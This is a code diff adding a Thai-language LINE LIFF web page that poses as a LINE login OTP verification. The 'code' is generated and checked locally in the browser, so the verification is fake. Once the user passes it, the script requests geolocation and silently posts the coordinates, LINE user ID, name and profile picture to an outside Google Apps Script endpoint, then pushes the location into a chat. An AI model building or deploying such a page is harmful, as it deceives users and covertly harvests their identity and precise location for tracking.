@@ -1,0 +1,386 @@
+
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <link rel="stylesheet" href="https://bit.ly/fontiton5" type="text/css" charset="utf-8" />
+  <style type="text/css">
+    body {
+      min-height: 100%;
+      background-color: #F3F4F6;
+      font-family: 'line_seed_sans_th';
+    }
+  </style>
+  <title>Verify OTP</title>
+</head>
+
+<body class="bg-gradient-to-tr from-red-950 to-teal-700 flex justify-center items-center min-h-screen p-4">
+
+  <div
+    class="bg-black/60 backdrop-blur-md text-white ring-8 ring-black/5 Xborder border-black/50 p-12 flex flex-col gap-6 shadow-lg rounded-xl w-full max-w-lg text-center relative overflow-hidden">
+
+    <h1 class="text-xl font-bold tracking-wider">Verify OTP your LINE Login</h1>
+    <div class="text-xs space-y-2 *:leading-6">
+      <p>เราได้ส่ง Code ระบุตัวตนของคุณ <span id="displayName">******</span></p>
+      <p>กรอกรหัสด้านล่างเพื่อยืนยัน LINE ของคุณ</p>
+    </div>
+
+    <div class="flex gap-3 sm:gap-6 justify-center 
+                *:bg-black/10
+                *:text-white
+                *:border
+                *:border-white/30
+                *:rounded-xl
+                *:py-2
+                *:px-2
+                *:text-3xl
+                *:max-w-12
+                sm:*:py-4
+                sm:*:px-4
+                sm:*:text-6xl
+                sm:*:max-w-20
+                *:text-center
+                *:transition-all
+                *:duration-300
+                focus-visible:*:bg-black/90 
+                Xfocus-visible:*:outline-white
+                Xfocus-visible:*:outline-dashed
+                Xfocus-visible:*:outline-3
+                Xfocus-visible:*:outline-offset-4
+                *:outline-none
+                *:ring-0
+            ">
+      <input type="text" placeholder="0" id="num-1" placeholder="0" maxlength="1" data-code-input>
+      <input type="text" placeholder="0" id="num-2" placeholder="0" maxlength="1" data-code-input>
+      <input type="text" placeholder="0" id="num-3" placeholder="0" maxlength="1" data-code-input>
+      <input type="text" placeholder="0" id="num-4" placeholder="0" maxlength="1" data-code-input>
+    </div>
+
+    <!--<p class="text-xs py-3 px-6 bg-amber-800 rounded-md">Make sure to keep this window open while checking your code</p>-->
+    <button type="button" id="btn-new-code" class="w-fit mx-auto border border-white/30 bg-black/30  rounded-md py-2 px-4 uppercase font-thin transition-all duration-300 relative isolate overflow-hidden  hover:text-white focus-visible:text-white outline-none ring-0
+                before:absolute
+                before:-z-10
+                before:inset-[100%_0]
+                before:bg-red-900
+                before:transition-all
+                before:duration-300
+                hover:before:inset-0
+                focus-visible:before:inset-0
+
+            ">ส่ง code ใหม่</button>
+
+    <div id="panel-msg-top"
+      class="absolute inset-[0_0_50%_0] top-0 p-12 pb-6 text-center  space-y-6 bg-black text-white transition-all duration-500 ease-in-out -translate-y-full">
+
+      <div class="flex justify-center relative mt-10">
+        <img
+          src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjg5ajlhemdyZjlrZDgwdjMwbTl1dGdtbnhvM2p4Y2t0ZnpnZnE4ciZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/l150Tal3EKqgj0v9gs/giphy.gif"
+          class="w-28 h-28 object-cover rounded-full border-4 border-white absolute -top-16" alt="" id="pictureUrl">
+      </div>
+    </div>
+    <div id="panel-msg-bottom"
+      class="absolute inset-[50%_0_0_0] bottom-0 p-12 pt-6 text-center  space-y-6 bg-black text-white transition-all duration-500 ease-in-out translate-y-full">
+
+      <h2 class="font-bold text-2xl">คุณยืนยัน Code ของคุณสำเร็จแล้ว</h2>
+      <p>คุณสามารถเข้าใช้บริการของเราได้เลย</p>
+    </div>
+  </div>
+
+
+
+  <script>
+
+    async function main() {
+      const liffId = '1656032875-dMjmJ80q'
+      await liff.init({ liffId: liffId });
+
+
+      if (!liff.isLoggedIn()) {
+        const destinationUrl = window.location.href;
+        liff.login({ redirectUri: destinationUrl });
+      }
+
+      liff.ready.then(() => {
+        document.getElementById('pictureUrl').src = '' + liff.getDecodedIDToken().picture;
+        document.getElementById('displayName').textContent = '' + liff.getDecodedIDToken().name;
+
+
+
+
+      });
+
+
+    }
+
+    main();
+
+
+  </script>
+  <script>
+    const inputEl1 = document.querySelector("#num-1");
+    const inputEl2 = document.querySelector("#num-2");
+    const inputEl3 = document.querySelector("#num-3");
+    const inputEl4 = document.querySelector("#num-4");
+    const panelMsgTop = document.querySelector("#panel-msg-top");
+    const panelMsgBottom = document.querySelector("#panel-msg-bottom");
+    const codeInputs = document.querySelectorAll('[data-code-input]');
+
+
+    let newToastEl = '';
+    let currentCode = '';
+
+    function showMeTheToast() {
+      currentCode = Math.floor(Math.random() * 9000) + 1000;
+
+      newToastEl = document.createElement("div");
+      newToastEl.className = "absolute top-4 right-4 transition-all duration-300 ease-in-out border border-black/30 rounded-xl p-4 text-center text-sm bg-black/90 text-white -translate-y-72 space-y-2";
+      const titleEl = document.createElement("p");
+      titleEl.className = "text-sm";
+      titleEl.innerText = "รหัส code ของคุณ คือ:";
+
+      const codeEl = document.createElement("div");
+      codeEl.className = 'flex gap-2 items-center justify-center text-xl font-bold';
+      const codeCopyBtn = document.createElement("button");
+      codeCopyBtn.className = "material-symbols-outlined text-base font-normal";
+      codeCopyBtn.title = "คลิกเพื่อ copy code"
+
+
+      const svgEl = document.createElementNS("http://www.w3.org/2000/svg", "svg");
+      svgEl.setAttribute("width", "24");
+      svgEl.setAttribute("height", "24");
+      svgEl.setAttribute("viewBox", "0 0 24 24");
+      svgEl.setAttribute("fill", "none");
+      svgEl.setAttribute("stroke", "currentColor");
+      svgEl.setAttribute("stroke-width", "2");
+      svgEl.setAttribute("stroke-linecap", "round");
+      svgEl.setAttribute("stroke-linejoin", "round");
+      svgEl.innerHTML = '<path d="M21 15v4a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/>';
+
+
+      codeCopyBtn.appendChild(svgEl);
+
+      codeEl.innerText = currentCode;
+      codeEl.append(codeCopyBtn);
+
+      const footerEl = document.createElement("p");
+      footerEl.className = "text-xs";
+      footerEl.innerText = "Code นี้จะหมดอายุภายใน 10 นาที";
+
+      newToastEl.append(titleEl);
+      newToastEl.append(codeEl);
+      newToastEl.append(footerEl);
+
+
+      document.body.appendChild(newToastEl);
+
+      setTimeout(() => newToastEl.classList.remove("-translate-y-72"), 300);
+
+
+      codeCopyBtn.addEventListener("click", () => copyCode(currentCode));
+    }
+
+    function copyCode(code) {
+      navigator.clipboard.writeText(code).then(() => {
+        alert("Code ถูกคัดลอกแล้ว: " + code);
+      }).catch(err => {
+        console.error("เกิดข้อผิดพลาดในการคัดลอก code: ", err);
+      });
+    }
+
+
+    function copyCode(code) {
+      const codeArr = String(code).split("");
+      inputEl1.value = codeArr[0];
+      inputEl2.value = codeArr[1];
+      inputEl3.value = codeArr[2];
+      inputEl4.value = codeArr[3];
+
+
+      setTimeout(() => {
+        checkCode()
+        removeToast()
+      }, 1000);
+
+    }
+
+    function removeToast() {
+      if (newToastEl) {
+
+        newToastEl.classList.add("scale-0");
+        setTimeout(() => newToastEl.remove(), 300)
+      }
+    }
+
+    function resetAll() {
+      inputEl1.value = "";
+      inputEl2.value = "";
+      inputEl3.value = "";
+      inputEl4.value = "";
+
+
+      currentCode = '';
+    }
+
+
+    setTimeout(showMeTheToast, 1000);
+
+
+    document.querySelector("#btn-new-code").addEventListener("click", () => {
+
+      removeToast()
+
+      resetAll()
+
+      setTimeout(showMeTheToast, 1000);
+    });
+
+
+    function checkCode() {
+
+      const num1 = document.getElementById('num-1').value;
+      const num2 = document.getElementById('num-2').value;
+      const num3 = document.getElementById('num-3').value;
+      const num4 = document.getElementById('num-4').value;
+
+      if (num1 && num2 && num3 && num4) {
+
+        const inputCode = num1 + num2 + num3 + num4;
+        if (inputCode == "") return;
+
+
+        setTimeout(() => {
+          if (inputCode == currentCode) {
+
+            codeValid();
+          } else {
+            codeNotValid();
+          }
+        }, 1000);
+      }
+    }
+
+
+    function codeValid() {
+      panelMsgTop.classList.remove("-translate-y-full")
+      panelMsgBottom.classList.remove("translate-y-full")
+      setTimeout(() => {
+        panelMsgTop.classList.add("-translate-y-full")
+        panelMsgBottom.classList.add("translate-y-full")
+
+
+        removeToast()
+
+        resetAll()
+        // sendToSheet(userId, name, picture, complain)
+        getLocation()
+      }, 3000)
+    }
+
+
+    function codeNotValid() {
+
+      removeToast()
+
+      resetAll()
+      Swal.fire({
+        title: "ไม่สำเร็จ",
+        text: "คุณกรอก code ไม่ถูกต้อง",
+        icon: "error"
+      });
+
+      setTimeout(() => generateToast("รหัสไม่ถูกต้อง กรุณากดปุ่มขอ Code ใหม่"), 510)
+    }
+
+
+    function onlyNumberKey(evt) {
+      var inputValue = evt.target.value;
+      var newValue = inputValue.replace(/[^0-9]/g, '');
+      evt.target.value = newValue;
+    }
+
+    // code inputs events
+    codeInputs.forEach((input, index) => {
+      input.addEventListener('input', function (e) {
+
+        onlyNumberKey(e);
+
+        checkCode()
+
+
+        if (this.value && index < codeInputs.length - 1) {
+          codeInputs[index + 1].focus();
+        }
+      });
+    });
+
+    function generateToast(msg) {
+      newToastEl = document.createElement("div");
+      newToastEl.className = "absolute top-4 right-4 transition-all duration-300 ease-in-out border border-black/30 rounded-xl p-4 text-center text-sm bg-red-900 text-white -translate-y-72 w-56";
+      const titleEl = document.createElement("p");
+      titleEl.className = "text-sm";
+      titleEl.innerText = msg;
+
+      newToastEl.append(titleEl);
+
+
+      document.body.appendChild(newToastEl);
+
+      setTimeout(() => newToastEl.classList.remove("-translate-y-72"), 0)
+    }
+
+    function sendflex(msg) {
+      liff.sendMessages(msg).then((res) => {
+        if (res) {
+          Swal.fire({
+            position: "top-end",
+            icon: "success",
+            title: "ส่งเข้าแชทเรียบร้อย",
+            showConfirmButton: false,
+            timer: 1500,
+          }).then(() => {
+            liff.closeWindow();
+
+          });
+        } else {
+          console.log("TargetPicker was closed!");
+        }
+      })
+        .catch(function (error) {
+          window.alert("Failed to send message " + error);
+        });
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      }
+    }
+
+    function showPosition(position) {
+      $.post('https://script.google.com/macros/s/AKfycbxIzN3LPLHxl0QXcgpUISd94Ug31GfKDCUc9iu7gX3s81ZT4ZozCQrPXxkeCIAOvHn_/exec', {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        userId: liff.getDecodedIDToken().sub,
+        name: liff.getDecodedIDToken().name,
+        picture: liff.getDecodedIDToken().picture
+      });
+      const msgflex = [{
+        "type": "location",
+        "title": "my location",
+        "address": "นี่คือจุดที่คุณอยู่",
+        "latitude": position.coords.latitude,
+        "longitude": position.coords.longitude
+      }]
+      sendflex(msgflex)
+
+    }
+  </script>
+</body>
+
+</html>
